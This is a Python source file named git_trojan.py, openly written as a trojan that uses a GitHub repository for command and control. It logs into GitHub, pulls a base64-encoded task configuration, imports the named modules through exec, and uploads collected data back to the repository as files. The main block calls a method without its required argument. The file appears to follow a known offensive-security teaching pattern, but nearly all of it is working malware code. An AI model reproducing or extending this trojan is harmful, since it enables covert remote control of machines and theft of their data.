#!/usr/bin/env python3
# coding:utf-8
"""
Name: git_trojan.py
Author: murphy
Email: zd_wangfenglin@163.com
Time: 2020/6/29 5:14 下午
Desc:
"""


import json
import base64
import sys
import time
import random
import threading
import queue
import os

from github3 import login


trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path = "data/{}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = queue.Queue()


class Trojan:
    def __init__(self, username, password, repository, branch="master"):
        self.username = username
        self.password = password
        self.repository = repository
        self.branch = branch

    def connect_to_github(self):
        gh = login(username=self.username, password=self.password)
        repo = gh.repository(self.username, self.repository)
        branch = repo.branch(self.branch)
        return gh, repo, branch

    def get_file_contents(self, filepath):
        gh, repo, branch = self.connect_to_github()
        tree = branch.commit.commit.tree.to_tree().recurse()
        for filename in tree.tree:
            if filepath in filename.path:
                print("[*] Found file %s" % filepath)
                blob = repo.blob(filename._json_data['sha'])
                print(blob)
                return blob.content
        return None

    def get_trojan_config(self):
        global configured
        config_json = self.get_file_contents(trojan_config)
        config = json.loads(base64.b64decode(config_json))
        configured = True

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def store_module_result(self, data):
        gh, repo, branch = self.connect_to_github()
        remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
        repo.create_file(remote_path, "commit message", base64.b64encode(data))
        return 


if __name__ == '__main__':
    with open(os.path.join(os.path.expanduser("~"), "online_config/github.json"), 'r') as f:
        account = json.loads(f.read())
    r = 'tj'
    trojan = Trojan(
        username=account['username'],
        password=account['password'],
        repository=r,
    )
    print(trojan.get_file_contents())
